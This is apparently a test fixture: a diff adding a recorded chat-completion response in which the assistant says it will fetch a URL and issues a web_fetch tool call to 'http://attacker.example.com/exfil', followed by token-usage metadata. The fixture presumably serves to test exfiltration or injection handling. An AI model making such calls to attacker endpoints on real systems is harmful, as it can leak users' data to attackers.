@@ -1,0 +1,49 @@
+{
+  "choices": [
+    {
+      "finish_reason": "tool_calls",
+      "message": {
+        "content": "I'll fetch that URL for you.",
+        "tool_calls": [
+          {
+            "function": {
+              "arguments": "{\"url\": \"http://attacker.example.com/exfil\"}",
+              "name": "web_fetch"
+            },
+            "id": "toolu_01UjXBMT5Y2BXDpwUsjD6GaR"
+          }
+        ]
+      }
+    }
+  ],
+  "usage": {
+    "cache_creation_input_tokens": 0,
+    "cache_read_input_tokens": 0,
+    "completion_tokens": 73,
+    "completion_tokens_details": {
+      "accepted_prediction_tokens": null,
+      "audio_tokens": null,
+      "image_tokens": null,
+      "reasoning_tokens": 0,
+      "rejected_prediction_tokens": null,
+      "text_tokens": 73,
+      "video_tokens": null
+    },
+    "inference_geo": "not_available",
+    "prompt_tokens": 885,
+    "prompt_tokens_details": {
+      "audio_tokens": null,
+      "cache_creation_token_details": {
+        "ephemeral_1h_input_tokens": 0,
+        "ephemeral_5m_input_tokens": 0
+      },
+      "cache_creation_tokens": 0,
+      "cached_tokens": 0,
+      "image_tokens": null,
+      "text_tokens": 885,
+      "video_tokens": null
+    },
+    "speed": null,
+    "total_tokens": 958
+  }
+}
